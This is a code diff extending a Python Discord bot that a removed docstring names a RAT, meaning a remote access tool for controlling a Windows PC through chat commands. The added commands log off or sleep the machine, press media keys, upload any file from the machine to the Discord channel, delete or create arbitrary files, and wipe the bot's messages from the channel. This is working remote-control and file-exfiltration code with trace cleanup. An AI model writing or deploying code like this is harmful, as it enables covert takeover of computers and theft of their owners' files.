             await send_embed(ctx, "Safety Violation", "Delay must be at least **10 seconds**", discord.Color.orange())
@@ -756,7 +1291,6 @@ async def cmd_shutdown(ctx, delay: int = 60):
 @bot.command(name='restart')
 @is_authorized()
 async def cmd_restart(ctx, delay: int = 60):
-    """Restart PC with delay"""
     try:
         if delay < 10:
             await send_embed(ctx, "Safety Violation", "Delay must be at least **10 seconds**", discord.Color.orange())
@@ -772,12 +1306,29 @@ async def cmd_restart(ctx, delay: int = 60):
     except Exception as e:
         await send_embed(ctx, "Restart Error", f"Failed to restart: {str(e)}", discord.Color.red())
 
+@bot.command(name='sleep')
+@is_authorized()
+async def cmd_sleep(ctx):
+    try:
+        ctypes.windll.powrprof.SetSuspendState(0, 1, 0)
+        await send_embed(ctx, "💤 Sleep", "Computer is going to sleep!", discord.Color.blue())
+    except Exception as e:
+        await send_embed(ctx, "Sleep Error", f"Failed: {str(e)}", discord.Color.red())
+
+@bot.command(name='logoff')
+@is_authorized()
+async def cmd_logoff(ctx):
+    try:
+        os.system('shutdown /l')
+        await send_embed(ctx, "👋 Logoff", "Logging off user!", discord.Color.orange())
+    except Exception as e:
+        await send_embed(ctx, "Logoff Error", f"Failed: {str(e)}", discord.Color.red())
+
 # ========== MEDIA COMMANDS ==========
 
 @bot.command(name='playpause')
 @is_authorized()
 async def cmd_playpause(ctx):
-    """Play/Pause media"""
     try:
         pyautogui.press('playpause')
         await send_embed(ctx, "⏯️ Media", "Toggled play/pause", discord.Color.purple())
@@ -787,19 +1338,53 @@ async def cmd_playpause(ctx):
 @bot.command(name='nexttrack')
 @is_authorized()
 async def cmd_nexttrack(ctx):
-    """Next track"""
     try:
         pyautogui.press('nexttrack')
         await send_embed(ctx, "⏭️ Media", "Next track", discord.Color.purple())
     except Exception as e:
         await send_embed(ctx, "Media Error", f"Failed to control media: {str(e)}", discord.Color.red())
 
+@bot.command(name='prevtrack')
+@is_authorized()
+async def cmd_prevtrack(ctx):
+    try:
+        pyautogui.press('prevtrack')
+        await send_embed(ctx, "⏮️ Media", "Previous track", discord.Color.purple())
+    except Exception as e:
+        await send_embed(ctx, "Media Error", f"Failed to control media: {str(e)}", discord.Color.red())
+
+@bot.command(name='volumeup')
+@is_authorized()
+async def cmd_volumeup(ctx):
+    try:
+        pyautogui.press('volumeup')
+        await send_embed(ctx, "🔊 Media", "Volume up", discord.Color.purple())
+    except Exception as e:
+        await send_embed(ctx, "Media Error", f"Failed: {str(e)}", discord.Color.red())
+
+@bot.command(name='volumedown')
+@is_authorized()
+async def cmd_volumedown(ctx):
+    try:
+        pyautogui.press('volumedown')
+        await send_embed(ctx, "🔉 Media", "Volume down", discord.Color.purple())
+    except Exception as e:
+        await send_embed(ctx, "Media Error", f"Failed: {str(e)}", discord.Color.red())
+
+@bot.command(name='mute')
+@is_authorized()
+async def cmd_mute(ctx):
+    try:
+        pyautogui.press('volumemute')
+        await send_embed(ctx, "🔇 Media", "Volume muted", discord.Color.purple())
+    except Exception as e:
+        await send_embed(ctx, "Media Error", f"Failed: {str(e)}", discord.Color.red())
+
 # ========== FILES COMMANDS ==========
 
 @bot.command(name='listfiles')
 @is_authorized()
 async def cmd_listfiles(ctx, directory: str = "."):
-    """List files in a directory"""
     try:
         files = os.listdir(directory)
 
@@ -824,12 +1409,66 @@ async def cmd_listfiles(ctx, directory: str = "."):
     except Exception as e:
         await send_embed(ctx, "List Files Error", f"Failed to list files: {str(e)}", discord.Color.red())
 
+@bot.command(name='download')
+@is_authorized()
+async def cmd_download(ctx, *, filepath: str):
+    try:
+        if not os.path.exists(filepath):
+            await send_embed(ctx, "Download Error", "File not found!", discord.Color.red())
+            return
+        
+        await ctx.send(file=discord.File(filepath))
+        await send_embed(ctx, "Download Complete", f"Sent: **{filepath}**", discord.Color.green())
+    except Exception as e:
+        await send_embed(ctx, "Download Error", f"Failed: {str(e)}", discord.Color.red())
+
+@bot.command(name='deletefile')
+@is_authorized()
+async def cmd_deletefile(ctx, *, filepath: str):
+    try:
+        if os.path.exists(filepath):
+            os.remove(filepath)
+            await send_embed(ctx, "File Deleted", f"Deleted: **{filepath}**", discord.Color.red())
+        else:
+            await send_embed(ctx, "File Not Found", f"File not found: **{filepath}**", discord.Color.orange())
+    except Exception as e:
+        await send_embed(ctx, "Delete Error", f"Failed: {str(e)}", discord.Color.red())
+
+@bot.command(name='createfile')
+@is_authorized()
+async def cmd_createfile(ctx, filename: str, *, content: str = ""):
+    try:
+        with open(filename, 'w') as f:
+            f.write(content)
+        await send_embed(ctx, "File Created", f"Created: **{filename}**", discord.Color.green())
+    except Exception as e:
+        await send_embed(ctx, "Create Error", f"Failed: {str(e)}", discord.Color.red())
+
 # ========== BOT COMMANDS ==========
+
+@bot.command(name='clearchat')
+@is_authorized()
+async def cmd_clearchat(ctx, amount: int = 100):
+    try:
+        deleted = 0
+        async for message in ctx.channel.history(limit=amount):
+            if message.author == bot.user:
+                await message.delete()
+                deleted += 1
+                await asyncio.sleep(0.1)
+        
+        if deleted > 0:
+            msg = await ctx.send(f"✅ Deleted **{deleted}** bot messages!")
+            await asyncio.sleep(2)
+            await msg.delete()
+        else:
+            await ctx.send("No bot messages found to delete.", delete_after=3)
+    except Exception as e:
+        await send_embed(ctx, "Clear Error", f"Failed: {str(e)}", discord.Color.red())
 
 @bot.command(name='exit')
 @is_authorized()
 async def cmd_exit(ctx):
-    """Close the RAT"""
     try:
         embed = discord.Embed(
             title="👋 Goodbye!",
